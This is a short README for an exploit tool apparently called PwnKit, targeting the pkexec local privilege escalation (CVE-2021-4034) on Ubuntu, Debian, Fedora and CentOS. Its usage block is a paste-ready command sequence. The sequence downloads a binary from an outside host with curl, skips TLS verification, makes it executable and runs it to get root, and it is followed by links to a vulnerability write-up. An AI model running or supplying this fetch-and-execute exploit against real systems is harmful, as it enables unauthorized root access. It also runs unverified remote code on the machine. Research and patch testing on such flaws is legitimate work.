# PwnKit

Self-contained exploit for CVE-2021-4034 - Pkexec Local Privilege Escalation

## Usage

Should work out of the box on Linux distributions based on Ubuntu, Debian, Fedora, and CentOS.

```bash
cd /tmp;
curl -fskSL x.xi.vg/lpe/pwnkit >> pwnkit;
chmod +x ./pwnkit;
./pwnkit
```

## Example

![](./imgs/example.png)

## Technical Details

- https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034

## References

- https://github.com/arthepsy/CVE-2021-4034/
